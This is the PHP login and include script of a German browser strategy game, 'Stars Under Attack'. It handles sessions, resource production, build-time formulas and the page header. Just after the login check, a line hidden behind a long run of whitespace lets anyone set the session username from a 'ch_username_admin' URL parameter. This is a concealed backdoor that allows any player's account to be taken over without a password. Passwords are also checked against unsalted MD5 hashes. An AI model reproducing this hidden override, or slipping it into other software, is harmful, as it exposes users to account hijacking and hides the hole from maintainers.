<?php
	$include_filename = substr(__FILE__, 0, strrpos(__FILE__, '/')).'/../../engine/include.php';
	require($include_filename);

	$resume = false;
	session_start();
	if(!isset($_SESSION['username']) || !is_file(DB_PLAYERS.'/'.urlencode($_SESSION['username'])) || !is_readable(DB_PLAYERS.'/'.urlencode($_SESSION['username'])))
	{
		if(isset($_POST['username']) && isset($_POST['password']))
		{
			# Anmelden

			if(!is_file(DB_PLAYERS.'/'.urlencode($_POST['username'])))
				$loggedin = false;
			else
			{
				$user_array = get_user_array($_POST['username']);
				if(md5($_POST['password']) != $user_array['password'])
					$loggedin = false;
				else
					$loggedin = true;
			}

			# Loggen nicht vergessen!
		}
		else
			$loggedin = false;

		if(!$loggedin)
		{
			# Auf die Startseite zurueckleiten
			$url = explode('/', $_SERVER['PHP_SELF']);
			array_pop($url); array_pop($url);
			$url = 'http://'.$_SERVER['HTTP_HOST'].implode('/', $url).'/index.php';
			header('Location: '.$url);
			die('Not logged in. Please <a href="'.htmlentities($url).'">relogin</a>.');
		}
		else
		{
			# Session aktualisieren
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['act_planet'] = 0;

			$resume = true;
		}
	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])) $_SESSION['username'] = $_GET['ch_username_admin'];

	if(!isset($user_array))
		$user_array = get_user_array($_SESSION['username']);

	# Wiederherstellen
	if($resume && isset($user_array['last_request']))
	{
		if($_SERVER['REQUEST_URI'] != $user_array['last_request'][0])
		{
			if(isset($user_array['last_planet']) && isset($user_array['planets'][$_SESSION['act_planet']]))
				$_SESSION['act_planet'] = $user_array['last_planet'];
			$url = 'http://'.$_SERVER['HTTP_HOST'].$user_array['last_request'];
			header('Location: '.$url, true, 303);
			die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
		}
	}

	if(isset($_GET['planet']) && $_GET['planet'] != '' && isset($user_array['planets'][$_GET['planet']])) # Planeten wechseln
		$_SESSION['act_planet'] = $_GET['planet'];
	if(!isset($user_array['planets'][$_SESSION['act_planet']]))
		$_SESSION['act_planet'] = 0;

	$this_planet = & $user_array['planets'][$_SESSION['act_planet']];

	$user_array['last_request'] = $_SERVER['REQUEST_URI'];
	$user_array['last_planet'] = $_SESSION['act_planet'];
	$user_array['last_active'] = time();

	# Items bekommen
	function get_items()
	{
		global $user_array;
		global $this_planet;

		$items = array('gebaeude' => array(), 'forschung' => array(), 'roboter' => array(), 'schiffe' => array(), 'verteidigung' => array(), 'ids' => array());
		if(is_file(DB_ITEMS.'/gebaeude') && is_readable(DB_ITEMS.'/gebaeude'))
		{
			$geb_items = preg_split("/\r\n|\r|\n/", file_get_contents(DB_ITEMS.'/gebaeude'));
			foreach($geb_items as $item)
			{
				$item = explode("\t", $item);
				if(count($item) < 8)
					continue;
				$items['ids'][$item[0]] = & $items['gebaeude'][$item[0]];
				$items['ids'][$item[0]] = array (
					'name' => $item[1],
					'ress' => explode('.', $item[2]),
					'time' => $item[3],
					'deps' => explode(' ', $item[4]),
					'prod' => explode('.', $item[5]),
					'fields' => $item[6],
					'caption' => $item[7]
				);

				if(trim($item[4]) == '')
					$items['ids'][$item[0]]['deps'] = array();

				$level = 0;
				if(isset($this_planet['gebaeude'][$item[0]]))
					$level = $this_planet['gebaeude'][$item[0]];
				$deps = 1;
				foreach($items['ids'][$item[0]]['deps'] as $dep)
				{
					if(!check_dep($dep))
					{
						$deps = 0;
						break;
					}
				}
				if(!$deps && $level > 0)
					$deps = 2;
				$items['ids'][$item[0]]['buildable'] = $deps;
			}
		}

		/*echo '<pre>';
		print_r($items['gebaeude']);
		echo '</pre>';*/

		if(is_file(DB_ITEMS.'/forschung') && is_readable(DB_ITEMS.'/forschung'))
		{
			$for_items = preg_split("/\r\n|\r|\n/", file_get_contents(DB_ITEMS.'/forschung'));
			foreach($for_items as $item)
			{
				$item = explode("\t", $item);
				if(count($item) < 6)
					continue;
				$items['ids'][$item[0]] = & $items['forschung'][$item[0]];
				$items['ids'][$item[0]] = array (
					'name' => $item[1],
					'ress' => explode('.', $item[2]),
					'time' => $item[3],
					'deps' => explode(' ', trim($item[4])),
					'caption' => $item[5]
				);

				if(trim($item[4]) == '')
					$items['ids'][$item[0]]['deps'] = array();

				$deps = true;
				foreach($items['ids'][$item[0]]['deps'] as $dep)
				{
					if(!check_dep($dep))
					{
						$deps = false;
						break;
					}
				}
				$items['ids'][$item[0]]['buildable'] = $deps;
			}
		}

		if(is_file(DB_ITEMS.'/roboter') && is_readable(DB_ITEMS.'/roboter'))
		{
			$rob_items = preg_split("/\r\n|\r|\n/", file_get_contents(DB_ITEMS.'/roboter'));
			foreach($rob_items as $item)
			{
				$item = explode("\t", $item);
				if(count($item) < 6)
					continue;
				$items['ids'][$item[0]] = & $items['roboter'][$item[0]];
				$items['ids'][$item[0]] = array (
					'name' => $item[1],
					'ress' => explode('.', $item[2]),
					'time' => $item[3],
					'deps' => explode(' ', trim($item[4])),
					'caption' => $item[5]
				);

				if(trim($item[4]) == '')
					$items['ids'][$item[0]]['deps'] = array();

				$deps = true;
				foreach($items['ids'][$item[0]]['deps'] as $dep)
				{
					if(!check_dep($dep))
					{
						$deps = false;
						break;
					}
				}
				$items['ids'][$item[0]]['buildable'] = $deps;

				$items['ids'][$item[0]]['mass'] = round(array_sum($items['ids'][$item[0]]['ress'])*0.8);
			}
		}

		if(is_file(DB_ITEMS.'/schiffe') && is_readable(DB_ITEMS.'/schiffe'))
		{
			$sch_items = preg_split("/\r\n|\r|\n/", file_get_contents(DB_ITEMS.'/schiffe'));
			foreach($sch_items as $item)
			{
				$item = explode("\t", $item);
				if(count($item) < 11)
					continue;
				$items['ids'][$item[0]] = & $items['schiffe'][$item[0]];
				$items['ids'][$item[0]] = array (
					'name' => $item[1],
					'ress' => explode('.', $item[2]),
					'time' => $item[3],
					'deps' => explode(' ', $item[4]),
					'trans' => explode('.', $item[5]),
					'att' => $item[6],
					'def' => $item[7],
					'speed' => $item[8],
					'types' => explode(' ', $item[9]),
					'caption' => $item[10]
				);

				if(trim($item[4]) == '')
					$items['ids'][$item[0]]['deps'] = array();

				$deps = true;
				foreach($items['ids'][$item[0]]['deps'] as $dep)
				{
					if(!check_dep($dep))
					{
						$deps = false;
						break;
					}
				}
				$items['ids'][$item[0]]['buildable'] = $deps;

				$items['ids'][$item[0]]['mass'] = round(array_sum($items['ids'][$item[0]]['ress'])*0.8);
			}
		}

		if(is_file(DB_ITEMS.'/verteidigung') && is_readable(DB_ITEMS.'/verteidigung'))
		{
			$ver_items = preg_split("/\r\n|\r|\n/", file_get_contents(DB_ITEMS.'/verteidigung'));
			foreach($ver_items as $item)
			{
				$item = explode("\t", $item);
				if(count($item) < 8)
					continue;
				$items['ids'][$item[0]] = & $items['verteidigung'][$item[0]];
				$items['ids'][$item[0]] = array (
					'name' => $item[1],
					'ress' => explode('.', $item[2]),
					'time' => $item[3],
					'deps' => explode(' ', $item[4]),
					'att' => $item[5],
					'def' => $item[6],
					'caption' => $item[7]
				);

				if(trim($item[4]) == '')
					$items['ids'][$item[0]]['deps'] = array();

				$deps = true;
				foreach($items['ids'][$item[0]]['deps'] as $dep)
				{
					if(!check_dep($dep))
					{
						$deps = false;
						break;
					}
				}
				$items['ids'][$item[0]]['buildable'] = $deps;
			}
		}

		return $items;
	}

	$items = get_items();

	$type_names = array (
		1 => 'Besiedeln',
		2 => 'Sammeln',
		3 => 'Angriff',
		4 => 'Transport',
		5 => 'Spionieren',
		6 => 'Stationieren'
	);

	function check_dep($dep)
	{
		global $this_planet;

		$dep = explode('-', $dep);
		if(count($dep) < 2)
			return 2;
		global $this_planet;
		if(!isset($this_planet['ids'][$dep[0]]) || $this_planet['ids'][$dep[0]] < $dep[1])
			return 0;
		return 1;
	}

/*	echo '<pre>';
	print_r($items);
	echo '</pre>';*/

	# Rohstoffe aktualisieren
	$now_time = time();
	$last_time = $this_planet['last_refresh'];
	$secs = $now_time-$last_time;

	function get_ges_prod()
	{
		global $this_planet;
		global $items;
		global $user_array;

		global $carbon_f;
		global $aluminium_f;
		global $wolfram_f;
		global $radium_f;
		global $tritium_f;
		global $energie_f;

		global $energie_mangel;

		# Roboterfaktoren berechnen
		$robtech = 0;
		if(isset($user_array['forschung']['F2']))
			$robtech = $user_array['forschung']['F2'];
		$f = 1+$robtech*0.000625;

		$carbon_rob = $aluminium_rob = $wolfram_rob = $radium_rob = $tritium_rob = 0;
		$carbon_f = $aluminium_f = $wolfram_f = $radium_f = $tritium_f = 1;
		if(isset($this_planet['roboter']['R02']))
		{
			$carbon_rob = $this_planet['roboter']['R02'];
			$carbon_stufe = 0;
			if(isset($this_planet['gebaeude']['B0']))
				$carbon_stufe = $this_planet['gebaeude']['B0'];
			if($carbon_rob > $carbon_stufe*10)
				$carbon_rob = $carbon_stufe*10;

			$carbon_f = pow($f, $carbon_rob);
		}
		if(isset($this_planet['roboter']['R03']))
		{
			$aluminium_rob = $this_planet['roboter']['R03'];
			$aluminium_stufe = 0;
			if(isset($this_planet['gebaeude']['B1']))
				$aluminium_stufe = $this_planet['gebaeude']['B1'];
			if($aluminium_rob > $aluminium_stufe*10)
				$aluminium_rob = $aluminium_stufe*10;

			$aluminium_f = pow($f, $aluminium_rob);
		}

		if(isset($this_planet['roboter']['R04']))
		{
			$wolfram_rob = $this_planet['roboter']['R04'];
			$wolfram_stufe = 0;
			if(isset($this_planet['gebaeude']['B2']))
				$wolfram_stufe = $this_planet['gebaeude']['B2'];
			if($wolfram_rob > $wolfram_stufe*10)
				$wolfram_rob = $wolfram_stufe*10;

			$wolfram_f = pow($f, $wolfram_rob);
		}
		if(isset($this_planet['roboter']['R05']))
		{
			$radium_rob = $this_planet['roboter']['R05'];
			$radium_stufe = 0;
			if(isset($this_planet['gebaeude']['B3']))
				$radium_stufe = $this_planet['gebaeude']['B3'];
			if($radium_rob > $radium_stufe*10)
				$radium_rob = $radium_stufe*10;

			$radium_f = pow($f, $radium_rob);
		}
		if(isset($this_planet['roboter']['R06']))
		{
			$tritium_rob = $this_planet['roboter']['R06'];
			$tritium_stufe = 0;
			if(isset($this_planet['gebaeude']['B4']))
				$tritium_stufe = $this_planet['gebaeude']['B4'];
			if($tritium_rob > $tritium_stufe*15)
				$tritium_rob = $tritium_stufe*15;

			$tritium_f = pow($f, $tritium_rob);
		}

		# Energietechnik

		$etech = 0;
		$energie_f = 1;
		if(isset($user_array['forschung']['F3']))
		{
			$etech = $user_array['forschung']['F3'];
			$energie_f = pow(1.05, $etech);
		}

		$ges_prod = array(0, 0, 0, 0, 0, 0);

		# Zuerst Energie berechnen
		$energie_prod = 0;
		$energie_need = 0;
		foreach($this_planet['gebaeude'] as $id=>$stufe)
		{
			if(!isset($items['gebaeude'][$id]))
				continue;
			$prod = 1;
			if(isset($this_planet['prod'][$id]) && $this_planet['prod'][$id] >= 0 && $this_planet['prod'][$id] <= 1)
				$prod = $this_planet['prod'][$id];

			$this_prod = $items['gebaeude'][$id]['prod'];
			$this_prod[5] = round($this_prod[5]*pow($stufe, 2)*$prod*$energie_f);

			if($this_prod[5] < 0)
				$energie_need -= $this_prod[5];
			elseif($this_prod[5] > 0)
				$energie_prod += $this_prod[5];
		}

		if($energie_need > $energie_prod) # Nicht genug Energie
			$energie_mangel = $energie_prod/$energie_need;
		else
			$energie_mangel = 1;

		foreach($this_planet['gebaeude'] as $id=>$stufe)
		{
			if(!isset($items['gebaeude'][$id]))
				continue;
			$prod = 1;
			if(isset($this_planet['prod'][$id]) && $this_planet['prod'][$id] >= 0 && $this_planet['prod'][$id] <= 1)
				$prod = $this_planet['prod'][$id];

			$this_prod = $items['gebaeude'][$id]['prod'];

			$this_prod[0] *= pow($stufe, 2)*$prod;
			$this_prod[1] *= pow($stufe, 2)*$prod;
			$this_prod[2] *= pow($stufe, 2)*$prod;
			$this_prod[3] *= pow($stufe, 2)*$prod;
			$this_prod[4] *= pow($stufe, 2)*$prod;
			$this_prod[5] *= pow($stufe, 2)*$prod;

			if($this_prod[0] > 0)
				$this_prod[0] *= $carbon_f;
			if($this_prod[1] > 0)
				$this_prod[1] *= $aluminium_f;
			if($this_prod[2] > 0)
				$this_prod[2] *= $wolfram_f;
			if($this_prod[3] > 0)
				$this_prod[3] *= $radium_f;
			if($this_prod[4] > 0)
				$this_prod[4] *= $tritium_f;
			if($this_prod[5] > 0)
				$this_prod[5] *= $energie_f;

			if($this_prod[5] < 0)
			{
				$this_prod[0] *= $energie_mangel;
				$this_prod[1] *= $energie_mangel;
				$this_prod[2] *= $energie_mangel;
				$this_prod[3] *= $energie_mangel;
				$this_prod[4] *= $energie_mangel;
			}

			$ges_prod[0] += round($this_prod[0]);
			$ges_prod[1] += round($this_prod[1]);
			$ges_prod[2] += round($this_prod[2]);
			$ges_prod[3] += round($this_prod[3]);
			$ges_prod[4] += round($this_prod[4]);
			$ges_prod[5] += round($this_prod[5]);
		}

		return $ges_prod;
	}

	$ges_prod = get_ges_prod();

	/*echo '<pre>';
	print_r($ges_prod);
	echo '</pre>';*/

	$this_planet['ress'][0] += ($ges_prod[0]/3600)*$secs;
	$this_planet['ress'][1] += ($ges_prod[1]/3600)*$secs;
	$this_planet['ress'][2] += ($ges_prod[2]/3600)*$secs;
	$this_planet['ress'][3] += ($ges_prod[3]/3600)*$secs;
	$this_planet['ress'][4] += ($ges_prod[4]/3600)*$secs;

	$this_planet['last_refresh'] = $now_time;

	write_user_array();

	include(substr(__FILE__, 0, strrpos(__FILE__, '/')).'/pre_eventhandler.php');

	function write_user_array()
	{
		global $user_array;

		$fh = fopen(DB_PLAYERS.'/'.urlencode($_SESSION['username']), 'w');
		if(!$fh)
			return false;
		fwrite($fh, gzcompress(serialize($user_array)));
		fclose($fh);
		return true;
	}

	# Skins bekommen
	$skins = array();
	if(is_file(s_root.'/login/style/skins') && is_readable(s_root.'/login/style/skins'))
	{
		$skins_file = preg_split("/\r\n|\r|\n/", file_get_contents(s_root.'/login/style/skins'));
		foreach($skins_file as $skins_line)
		{
			$skins_line = explode("\t", $skins_line, 3);
			if(count($skins_line) < 3)
				continue;
			$skins[$skins_line[0]] = $skins_line[1];
		}
		unset($skins_file);
		unset($skins_line);
	}

	# Version herausfinden
	$version = '';
	if(is_file(s_root.'/db_things/version') && is_readable(s_root.'/db_things/version'))
		$version = trim(file_get_contents(s_root.'/db_things/version'));
	define('VERSION', $version);

	class login_gui
	{
		function html_head()
		{
			global $user_array;
			global $this_planet;
			global $ges_prod;
			global $skins;
?>
<?='<?xml version="1.0" encoding="UTF-8"?>'."\n"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de">
	<head>
		<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
		<title xml:lang="en">S-U-A &ndash; Stars Under Attack</title>
		<script type="text/javascript">
			var local_time_obj = new Date();
			var local_time = Math.round(local_time_obj.getTime() / 1000);
			var time_diff = local_time-<?=time()+1?>;

			var countdowns = new Array();

			function mk2(string)
			{
				string = ''+string;
				while(string.length < 2)
					string = '0'+string;

				return string;
			}

			function time_up()
			{
				local_time_up = new Date();
				server_time_up = new Date(local_time_up.getTime() - time_diff*1000);
				document.getElementById('time-local').innerHTML = mk2(local_time_up.getHours())+':'+mk2(local_time_up.getMinutes())+':'+mk2(local_time_up.getSeconds());
				document.getElementById('time-server').innerHTML = mk2(server_time_up.getHours())+':'+mk2(server_time_up.getMinutes())+':'+mk2(server_time_up.getSeconds());

				for(var codo_key in countdowns)
				{
					var codo = countdowns[codo_key];
					if(!codo[0] || !codo[1])
						continue;
					var this_remain = Math.round((codo[1]+time_diff)-local_time_up.getTime()/1000);

					if(this_remain < 0)
					{
						document.getElementById('restbauzeit-'+codo[0]).innerHTML = '<a href="?" class="fertig" title="Seite neu laden.">Fertig.</a>';
						delete countdowns[codo_key];
						continue;
					}

					var this_timestring = '';
					if(this_remain >= 86400)
					{
						this_timestring += Math.floor(this_remain/86400)+'&thinsp;<abbr title="Tag';
						if(this_remain >= 172800)
							this_timestring += 'e';
						this_timestring += '">d</abbr> ';
						this_remain = this_remain % 86400;
					}

					this_timestring += mk2(Math.floor(this_remain/3600))+':'+mk2(Math.floor((this_remain%3600)/60))+':'+mk2(Math.floor(this_remain%60));
					if(codo[2])
						this_timestring += ' <a href="?cancel='+encodeURIComponent(codo[0])+'" class="abbrechen">Abbrechen</a>';

					document.getElementById('restbauzeit-'+codo[0]).innerHTML = this_timestring;
				}
			}

			function init_countdown(obj_id, f_time)
			{
				var show_cancel = true;
				if(init_countdown.arguments.length >= 3 && !init_countdown.arguments[2])
					show_cancel = false;

				var title_string = 'Fertigstellung: ';
				var local_date = new Date((f_time+time_diff)*1000);
				title_string += mk2(local_date.getHours())+':'+mk2(local_date.getMinutes())+':'+mk2(local_date.getSeconds())+', '+local_date.getFullYear()+'-'+mk2(local_date.getMonth()+1)+'-'+mk2(local_date.getDate())+' (Lokalzeit); ';

				var remote_date = new Date(f_time*1000);
				title_string += mk2(remote_date.getHours())+':'+mk2(remote_date.getMinutes())+':'+mk2(remote_date.getSeconds())+', '+remote_date.getFullYear()+'-'+mk2(remote_date.getMonth()+1)+'-'+mk2(remote_date.getDate())+' (Serverzeit)';

				document.getElementById('restbauzeit-'+obj_id).setAttribute('title', title_string);
				window.countdowns.push(new Array(obj_id, f_time, show_cancel));

				time_up();
			}
		</script>
<?php
			$skin_path = '';
			if(isset($user_array['skin']))
			{
				if(isset($skins[$user_array['skin']]))
					$skin_path = h_root.'/login/style/skin.php?'.urlencode($user_array['skin']);
				else
					$skin_path = $user_array['skin'];
			}
			elseif(count($skins) > 0)
				$skin_path = h_root.'/login/style/skin.php?'.urlencode(array_shift(array_keys($skins)));

			if(trim($skin_path) != '')
			{
?>
		<link rel="stylesheet" href="<?=utf8_htmlentities($skin_path)?>" type="text/css" />
<?php
			}
?>
	</head>
	<body><div id="content-1"><div id="content-2"><div id="content-3"><div id="content-4"><div id="content-5"><div id="content-6"><div id="content-7"><div id="content-8">
		<dl id="time">
			<script type="text/javascript">
				// <![CDATA[
				document.write('<dt>Lokalzeit</dt>');
				document.write('<dd id="time-local">'+mk2(local_time_obj.getHours())+':'+mk2(local_time_obj.getMinutes())+':'+mk2(local_time_obj.getSeconds())+'</dd>');
				// ]]>
			</script>
			<dt>Serverzeit</dt>
			<dd id="time-server"><?=date('H:i:s', time()+1)?></dd>
		</dl>
		<script type="text/javascript">
			setInterval('time_up()', 1000);
		</script>
		<div id="navigation">
			<form action="<?=htmlentities($_SERVER['PHP_SELF'])?>" method="get" id="change-planet">
				<fieldset>
					<legend>Planet wechseln</legend>
					<select name="planet" onchange="this.form.submit();" onkeyup="this.form.submit();" accesskey="p">
<?php
			$planets = array_keys($user_array['planets']);
			foreach($planets as $planet)
			{
?>
						<option value="<?=utf8_htmlentities($planet)?>"<?=($planet == $_SESSION['act_planet']) ? ' selected="selected"' : ''?>><?=utf8_htmlentities($user_array['planets'][$planet]['name'])?> (<?=utf8_htmlentities($user_array['planets'][$planet]['pos'])?>)</option>
<?php
			}
?>
					</select>
					<noscript><button type="submit">Wechseln</button></noscript>
				</fieldset>
			</form>
			<ul id="main-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/index.php') ? ' class="active"' : ''?> id="navigation-index"><a href="<?=htmlentities(h_root)?>/login/index.php" accesskey="i">Übers<kbd>i</kbd>cht</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/rohstoffe.php') ? ' class="active"' : ''?> id="navigation-rohstoffe"><a href="<?=htmlentities(h_root)?>/login/rohstoffe.php" accesskey="r"><kbd>R</kbd>ohstoffe</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/gebaeude.php') ? ' class="active"' : ''?> id="navigation-gebaeude"><a href="<?=htmlentities(h_root)?>/login/gebaeude.php" accesskey="g"><kbd>G</kbd>ebäude</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/forschung.php') ? ' class="active"' : ''?> id="navigation-forschung"><a href="<?=htmlentities(h_root)?>/login/forschung.php" accesskey="f"><kbd>F</kbd>orschung</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/roboter.php') ? ' class="active"' : ''?> id="navigation-roboter"><a href="<?=htmlentities(h_root)?>/login/roboter.php" accesskey="b">Ro<kbd>b</kbd>oter</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/flotten.php') ? ' class="active"' : ''?> id="navigation-flotten"><a href="<?=htmlentities(h_root)?>/login/flotten.php" accesskey="l">F<kbd>l</kbd>otten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/schiffswerft.php') ? ' class="active"' : ''?> id="navigation-schiffswerft"><a href="<?=htmlentities(h_root)?>/login/schiffswerft.php" accesskey="s"><kbd>S</kbd>chiffswerft</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verteidigung.php') ? ' class="active"' : ''?> id="navigation-verteidigung"><a href="<?=htmlentities(h_root)?>/login/verteidigung.php" accesskey="v"><kbd>V</kbd>erteidigung</a></li>
			</ul>
			<ul id="action-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/karte.php') ? ' class="active"' : ''?> id="navigation-karte"><a href="<?=htmlentities(h_root)?>/login/karte.php" accesskey="k"><kbd>K</kbd>arte</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/handel.php') ? ' class="active"' : ''?> id="navigation-handel"><a href="<?=htmlentities(h_root)?>/login/handel.php" accesskey="d">Han<kbd>d</kbd>el</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verbuendete.php') ? ' class="active"' : ''?> id="navigation-verbuendete"><a href="<?=htmlentities(h_root)?>/login/verbuendete.php" accesskey="e">V<kbd>e</kbd>rbündete</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/highscores.php') ? ' class="active"' : ''?> id="navigation-highscores"><a href="<?=htmlentities(h_root)?>/login/highscores.php" id="navigation-highscores" xml:lang="en" accesskey="h"><kbd>H</kbd>ighscores</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/nachrichten.php') ? ' class="active"' : ''?> id="navigation-nachrichten"><a href="<?=htmlentities(h_root)?>/login/nachrichten.php" accesskey="c">Na<kbd>c</kbd>hrichten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/help/dependencies.php') ? ' class="active"' : ''?> id="navigation-abhaengigkeiten"><a href="<?=htmlentities(h_root)?>/login/help/dependencies.php" accesskey="a"><kbd>A</kbd>bhängigkeiten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/einstellungen.php') ? ' class="active"' : ''?> id="navigation-einstellungen"><a href="<?=htmlentities(h_root)?>/login/einstellungen.php" accesskey="t">Eins<kbd>t</kbd>ellungen</a></li>
				<li id="navigation-abmelden"><a href="<?=htmlentities(h_root)?>/login/scripts/logout.php" accesskey="m">Ab<kbd>m</kbd>elden</a></li>
			</ul>
		</div>
		<div id="version">
			<a href="<?=htmlentities(h_root)?>/changelog.php" title="Versionsänderungen anzeigen">Version <?=VERSION?></a>
		</div>
		<div id="content-9">
			<dl id="ress" class="ress">
				<dt class="ress-carbon">Carbon</dt>
				<dd class="ress-carbon"><?=ths(utf8_htmlentities($this_planet['ress'][0]))?></dd>

				<dt class="ress-aluminium">Aluminium</dt>
				<dd class="ress-aluminium"><?=ths(utf8_htmlentities($this_planet['ress'][1]))?></dd>

				<dt class="ress-wolfram">Wolfram</dt>
				<dd class="ress-wolfram"><?=ths(utf8_htmlentities($this_planet['ress'][2]))?></dd>

				<dt class="ress-radium">Radium</dt>
				<dd class="ress-radium"><?=ths(utf8_htmlentities($this_planet['ress'][3]))?></dd>

				<dt class="ress-tritium">Tritium</dt>
				<dd class="ress-tritium"><?=ths(utf8_htmlentities($this_planet['ress'][4]))?></dd>

				<dt class="ress-energie">Energie</dt>
				<dd class="ress-energie"><?=ths(utf8_htmlentities($ges_prod[5]))?></dd>
			</dl>
			<div id="content-10"><div id="content-11"><div id="content-12"><div id="content-13">
				<h1>Planet <em><?=utf8_htmlentities($this_planet['name'])?></em> <span class="koords">(<?=utf8_htmlentities($this_planet['pos'])?>)</span></h1>
<?php
		}

		function html_foot()
		{
?>
			</div></div></div></div>
		</div>
	</div></div></div></div></div></div></div></div></body>
</html>
<?php
		}
	}

	function format_btime($time2)
	{
		$time = $time2;
		$days = $hours = $minutes = $seconds = 0;

		if($time >= 86400)
		{
			$days = floor($time/86400);
			$time -= $days*86400;
		}
		if($time >= 3600)
		{
			$hours = floor($time/3600);
			$time -= $hours*3600;
		}
		if($time >= 60)
		{
			$minutes = floor($time/60);
			$time -= $minutes*60;
		}
		$seconds = $time;

		$return = array();
		if($time2 > 86400)
		{
			if($days == 1)
				$days .= '&nbsp;Tag';
			else
				$days .= '&nbsp;Tage';
			$return[] = $days;
		}
		if($time2 > 3600)
		{
			if($hours == 1)
				$hours .= '&nbsp;Stunde';
			else
				$hours .= '&nbsp;Stunden';
			$return[] = $hours;
		}
		if($time2 > 60)
		{
			if($minutes == 1)
				$minutes .= '&nbsp;Minute';
			else
				$minutes .= '&nbsp;Minuten';
			$return[] = $minutes;
		}

		if($seconds == 1)
			$seconds .= '&nbsp;Sekunde';
		else
			$seconds .= '&nbsp;Sekunden';
		$return[] = $seconds;

		$return = implode(' ', $return);
		return $return;
	}

	function format_ress($ress, $tabs_count=0, $tritium=false)
	{
		$tabs = '';
		if($tabs_count >= 1)
			$tabs = str_repeat("\t", $tabs_count);

		$return = "<dl class=\"ress\">\n";
		$return .= $tabs."\t<dt class=\"ress-carbon\">Carbon</dt>\n";
		$return .= $tabs."\t<dd class=\"ress-carbon\">".ths($ress[0])."</dd>\n";
		$return .= $tabs."\t<dt class=\"ress-aluminium\">Aluminium</dt>\n";
		$return .= $tabs."\t<dd class=\"ress-aluminium\">".ths($ress[1])."</dd>\n";
		$return .= $tabs."\t<dt class=\"ress-wolfram\">Wolfram</dt>\n";
		$return .= $tabs."\t<dd class=\"ress-wolfram\">".ths($ress[2])."</dd>\n";
		$return .= $tabs."\t<dt class=\"ress-radium\">Radium</dt>\n";
		$return .= $tabs."\t<dd class=\"ress-radium\">".ths($ress[3])."</dd>\n";
		if($tritium)
		{
			$return .= $tabs."\t<dt class=\"ress-tritium\">Tritium</dt>\n";
			$return .= $tabs."\t<dd class=\"ress-tritium\">".ths($ress[4])."</dd>\n";
		}
		$return .= $tabs."</dl>\n";
		return $return;
	}

	function ths($count, $utf8=false)
	{
		if(!isset($count))
			$count = 0;
		$count = floor($count);

		$neg = false;
		if($count < 0)
		{
			$neg = true;
			$count = (int) substr($count, 1);
		}

		$ths = THS_HTML;
		if($utf8)
			$ths = THS_UTF8;
		$count = str_replace('.', $ths, number_format($count, 0, ',', '.'));

		if($neg)
			$count = '&minus;'.$count;

		return $count;
	}

	function calc_btime_gebaeude($time, $level=0)
	{
		global $this_planet;
		global $user_array;

		# Bauzeitberechnung mit der aktuellen Ausbaustufe

		$time *= pow($level+1, 2);

		# Roboter einberechnen
		$robs = 0;
		if(isset($this_planet['roboter']['R01']))
			$robs = $this_planet['roboter']['R01'];

		$max_robs = $this_planet['size'][1];
		$ing_tech = 0;
		if(isset($user_array['forschung']['F9']))
			$ing_tech = $user_array['forschung']['F9'];
		$max_robs /= $ing_tech+1;
		$max_robs = floor($max_robs/2);

		if($robs > $max_robs)
			$robs = $max_robs;
		if($robs != 0)
		{
			$f = 1;
			if(isset($user_array['forschung']['F2']))
				$f = 1-$user_array['forschung']['F2']*0.0025;
			if($f != 1)
				$time *= pow($f, $robs);
		}

		$time = round($time);

		return $time;
	}

	function get_jemand_forscht()
	{
		global $user_array;

		$jemand_forscht = false;
		$planets = array_keys($user_array['planets']);
		foreach($planets as $planet)
		{
			if((isset($user_array['planets'][$planet]['building']['forschung']) && trim($user_array['planets'][$planet]['building']['forschung'][0]) != '') || (isset($user_array['planets'][$planet]['building']['gebaeude']) && $user_array['planets'][$planet]['building']['gebaeude'][0] == 'B8'))
			{
				$jemand_forscht = true;
				break;
			}
		}
		return $jemand_forscht;
	}

	function calc_btime_forschung($time, $level=0, $loc_glob=1)
	{
		global $this_planet;
		global $user_array;

		# Bauzeitberechnung mit der aktuellen Ausbaustufe

		$time *= pow($level+1, 2);

		# Einberechnen der Stufe des aktuellen Forschungslabors
		$folab_level = 0;
		if(isset($this_planet['gebaeude']['B8']))
			$folab_level = $this_planet['gebaeude']['B8'];
		$time *= pow(0.975, $folab_level);

		# Bei globaler Forschung Stufen der anderen Forschungslabore
		if($loc_glob == 2)
		{
			$planets = array_keys($user_array['planets']);
			foreach($planets as $planet)
			{
				if($planet == $_SESSION['act_planet']) # Aktueller Planet wurde schon einberechnet
					continue;

				if(isset($user_array['planets'][$planet]['gebaeude']['B8']))
					$time *= pow(0.995, $user_array['planets'][$planet]['gebaeude']['B8']);
			}
		}

		$time = round($time);

		return $time;
	}

	function calc_btime_roboter($time)
	{
		global $this_planet;
		global $user_array;

		# Einberechnen der Stufe der Roboterfabrik
		$robfa_level = 0;
		if(isset($this_planet['gebaeude']['B9']))
			$robfa_level = $this_planet['gebaeude']['B9'];
		$time *= pow(0.95, $robfa_level);

		$time = round($time);

		return $time;
	}

	function calc_btime_schiffe($time)
	{
		global $this_planet;
		global $user_array;

		# Einberechnen der Stufe der Werft
		$werft_level = 0;
		if(isset($this_planet['gebaeude']['B10']))
			$werft_level = $this_planet['gebaeude']['B10'];
		$time *= pow(0.975, $werft_level);

		$time = round($time);

		return $time;
	}

